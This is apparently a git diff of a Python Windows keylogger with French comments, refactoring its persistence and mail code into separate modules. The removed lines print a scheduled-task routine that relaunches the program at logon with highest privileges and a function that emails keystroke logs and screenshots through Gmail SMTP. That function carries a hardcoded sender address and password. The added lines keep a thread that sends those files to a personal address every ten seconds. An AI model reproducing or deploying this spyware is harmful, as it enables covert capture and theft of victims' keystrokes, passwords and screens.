@@ -2,104 +2,27 @@ import logging
 from threading import Thread
 import PIL.ImageGrab
 from pynput.keyboard import Key, Listener
-import smtplib,ssl
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-import subprocess
 import time
 import os
-
+from TacheProgrammees import setupTaskScheduler
+from EnvoiMail import sendMail
 
 #--------DÉBUT TÂCHES PROGRAMMÉES---------------
 
-# Définir le chemin de l'exécutable
-executable_path = os.path.join(os.getcwd(), 'keyloggerWindows.exe')
-
-# Définir les paramètres de la tâche planifiée
-task_name = "Mon programme au démarrage"
-delay = 30  # Délai en secondes
-
-# Commande pour créer une tâche planifiée qui exécute l'exécutable au démarrage avec temporisation
-task_command = (
-    f'schtasks /create /tn "{task_name}" /tr "cmd /c timeout /t {delay} & {executable_path}" '
-    f'/sc onlogon /rl highest /f'
-)
-# Vérifier si la tâche existe déjà
-check_task = subprocess.run(['schtasks', '/query', '/tn', task_name], capture_output=True, text=True)
-
-# Ajouter la tâche planifiée si elle n'existe pas
-if "ERROR" in check_task.stdout:
-    result = subprocess.run(task_command, shell=True, capture_output=True, text=True)
-    if result.returncode == 0:
-        print(f"L'exécutable a été ajouté au démarrage avec le nom de tâche '{task_name}'.")
-    else:
-        print("Erreur lors de la création de la tâche :", result.stderr)
-else:
-    print("L'exécutable est déjà configuré pour démarrer automatiquement.")
-
+own_file=os.path.basename(__file__)
+setupTaskScheduler.setupTaskScheduler(own_file)
 
 #--------FIN TÂCHES PROGRAMMÉES----------------
 
 
 #--------DÉBUT PARTIE ENVOI MAIL----------------
 
-def sendMail():
-    # Configuration pour l'envoi de mail
-    port = 465
-    smtp_server = "smtp.gmail.com"
-    sender_email = "amazonoussama640@gmail.com"  # adresse mail bidon d'où le mail va être envoyé
-    receiver_email = "oussamaau123@gmail.com"    # adresse mail sur laquelle on veut recevoir le mail
-    password = "tdcf hoql nrco flxv"             # mot de passe de l'expéditeur
-    objet = "Fichier du keylog"
-    corps = "Envoi du fichier keylog"
-
-    # Création d'un mail multipart
-    message = MIMEMultipart()
-    message["From"] = sender_email
-    message["To"] = receiver_email
-    message["Subject"] = objet
-
-    message.attach(MIMEText(corps, "plain"))
-
-    filename = "keylogs.txt"
-    filename2 = "screen.png"
-
-    try:
-        with open(filename, "rb") as attachment:
-            part = MIMEBase("application", "octet-stream")
-            part.set_payload(attachment.read())
-        encoders.encode_base64(part)
-        part.add_header(
-            "Content-Disposition",
-            f"attachment; filename= {filename}",
-        )
-        message.attach(part)
-
-    except FileNotFoundError:
-        return
-
-    try:
-        with open(filename2, "rb") as attachment:
-            part2 = MIMEBase("application", "octet-stream")
-            part2.set_payload(attachment.read())
-        encoders.encode_base64(part2)
-        part2.add_header(
-        "Content-Disposition",
-        f"attachment; filename= {filename2}",
-        )
-        message.attach(part2)
-
-        context = ssl.create_default_context()
-
-        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
-            server.login(sender_email, password)
-            server.sendmail(sender_email, receiver_email, message.as_string())
-
-        print("Le mail a été envoyé")  # À enlever plus tard
-    except Exception as e:
-        print(f"Erreur lors de l'envoi du mail : {e}")
+def send():
+    sendMail.send_mail(receiver_email="oussamaau123@gmail.com",
+                       subject="Fichier du keylog",
+                       body="Envoi du fichier keylog",
+                       attachments=["keylogs.txt", "screen.png"]
+                       )
 
 #--------FIN PARTIE ENVOI MAIL------------------
 
@@ -120,7 +43,7 @@ def mail_thread():
     while True:
         time.sleep(10) #Temps d'attente entre deux mails
         screen()
-        sendMail()
+        send()
 
 # L'envoi du mail se fait sur un thread séparé
 Thread(target=mail_thread, daemon=True).start()
